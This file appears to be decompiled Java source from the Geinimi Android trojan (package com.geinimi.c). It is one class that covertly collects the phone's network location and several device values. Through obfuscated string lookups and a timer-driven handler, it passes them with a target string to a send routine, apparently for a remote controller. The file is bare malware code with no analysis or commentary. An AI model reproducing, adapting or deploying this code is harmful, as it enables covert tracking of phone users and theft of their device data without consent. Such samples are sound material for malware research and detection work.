package com.geinimi.c;

import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Handler;
import android.os.Looper;
import java.util.Timer;

public final class d {
    public static LocationListener a = null;
    public static String b = null;
    private static Thread c = new h();

    public static void a(double d, double d2) {
        if (b != null) {
            String str = b;
            b = null;
            LocationManager locationManager = (LocationManager) k.a().getSystemService("location");
            if (a != null) {
                locationManager.removeUpdates(a);
            }
            l.a(str, m.a(49) + k.f + m.a(50) + k.s + m.a(45) + k.b() + m.a(46) + k.c() + m.a(47) + k.d() + m.a(67) + k.e() + m.a(68) + k.f() + m.a(69) + k.g() + m.a(53) + d + m.a(54) + d2);
        }
    }

    public static void a(int i) {
        ((LocationManager) k.a().getSystemService("location")).requestLocationUpdates("network", (long) i, 0.0f, new e());
    }

    public static void a(String str) {
        b = str;
        LocationManager locationManager = (LocationManager) k.a().getSystemService("location");
        if (a == null) {
            a = new f();
        }
        try {
            locationManager.removeUpdates(a);
        } catch (Exception e) {
        }
        try {
            new Handler(Looper.getMainLooper()).post(c);
        } catch (Exception e2) {
        }
        new Timer().schedule(new g(), 80000);
    }

    public static boolean a(double[] dArr) {
        Location lastKnownLocation = ((LocationManager) k.a().getSystemService("location")).getLastKnownLocation("network");
        if (lastKnownLocation != null) {
            double latitude = lastKnownLocation.getLatitude();
            double longitude = lastKnownLocation.getLongitude();
            if (dArr != null && dArr.length >= 2) {
                dArr[0] = latitude;
                dArr[1] = longitude;
                return true;
            }
        }
        return false;
    }
}
